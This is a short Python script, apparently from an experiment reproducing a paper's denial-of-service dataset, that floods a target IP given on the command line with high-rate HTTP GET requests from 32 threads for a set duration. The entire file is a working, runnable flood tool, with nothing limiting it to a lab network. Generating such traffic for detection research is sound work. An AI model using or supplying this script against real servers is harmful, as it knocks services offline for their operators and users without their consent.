#!/usr/bin/env python3
"""HTTP flood from h4  (Table VII: 5% share, target CR 90%).

High-rate complete GET requests -- traffic that "closely resembles legitimate
web connections" (Sec IV.C.2), which is why its CR is the lowest.
"""
from __future__ import annotations
import argparse, random, socket, threading, time


def _worker(target_ip: str, port: int, end: float, rng: random.Random) -> None:
    paths = ["/", "/index.html", "/api/status", "/search?q=1", "/static/app.js"]
    while time.time() < end:
        try:
            s = socket.create_connection((target_ip, port), timeout=2)
            s.send(f"GET {rng.choice(paths)} HTTP/1.1\r\nHost: victim\r\nConnection: close\r\n\r\n".encode())
            s.recv(2048); s.close()
        except Exception:
            pass


def run(target_ip: str, duration_s: float = 30.0, port: int = 80, threads: int = 32, seed: int = 42) -> None:
    end = time.time() + duration_s
    ts = [threading.Thread(target=_worker, args=(target_ip, port, end, random.Random(seed + i)))
          for i in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()


if __name__ == "__main__":
    a = argparse.ArgumentParser(); a.add_argument("target"); a.add_argument("--duration", type=float, default=30.0)
    a.add_argument("--seed", type=int, default=42); n = a.parse_args(); run(n.target, n.duration, seed=n.seed)
